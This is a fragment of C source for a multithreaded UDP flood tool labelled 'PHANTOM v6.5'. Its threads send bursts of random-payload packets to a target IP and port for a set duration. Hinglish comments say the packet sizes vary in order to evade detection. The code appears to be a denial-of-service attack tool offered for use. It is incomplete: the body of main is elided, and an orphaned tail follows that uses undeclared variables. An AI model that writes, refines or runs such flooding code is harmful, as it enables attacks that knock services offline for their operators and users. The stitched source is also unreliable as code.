#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>

struct thread_data {
    char ip[16];
    int port;
    int duration;
};

void *prime_strike(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) return NULL;

    // PERFORMANCE: Non-blocking mode active
    fcntl(sock, F_SETFL, O_NONBLOCK);

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    char payload[1024];
    time_t end_time = time(NULL) + data->duration;
    
    while (time(NULL) < end_time) {
        // ✨ NEW: Har burst mein random payload generate karo
        for (int i = 0; i < 1024; i++) payload[i] = (char)(rand() % 255);
        
        for (int i = 0; i < 50; i++) {
            // ✨ NEW: Variable packet size (800-1024) detection se bachne ke liye
            int packet_size = 800 + (rand() % 225);
            sendto(sock, payload, packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        }
        // Thoda sa gap (nanoseconds) CPU load balance karne ke liye
        usleep(10); 
    }

    close(sock);
    pthread_exit(NULL);
}

// ... main function remains the same ...


    printf("🚀 [PHANTOM v6.5] Target: %s:%d | Nodes: 6 | Threads: %d\n", data.ip, data.port, threads_count);

    for (int i = 0; i < threads_count; i++) {
        pthread_create(&thread_id[i], NULL, prime_strike, (void *)&data);
    }

    for (int i = 0; i < threads_count; i++) {
        pthread_join(thread_id[i], NULL);
    }

    free(thread_id);
    printf("✅ [FINISHED] Strike Complete.\n");
    return 0;
}
